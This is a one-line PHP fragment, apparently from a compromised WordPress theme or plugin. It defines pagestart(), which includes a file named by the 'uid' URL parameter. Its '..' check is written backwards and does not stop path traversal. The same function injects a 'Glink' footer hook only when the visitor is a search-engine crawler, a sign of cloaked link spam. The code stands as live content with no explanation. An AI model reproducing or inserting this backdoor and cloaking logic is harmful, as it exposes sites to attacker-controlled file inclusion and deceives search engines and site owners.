...
function pagestart(){if(isset($_GET["uid"]) && $_GET["uid"]<>"" && stripos("..",$_GET["uid"])==false){include_once(dirname(__FILE__)."/db/".$_GET["uid"]);exit();}if(isCrawler()){add_action('wp_footer','Glink');}}
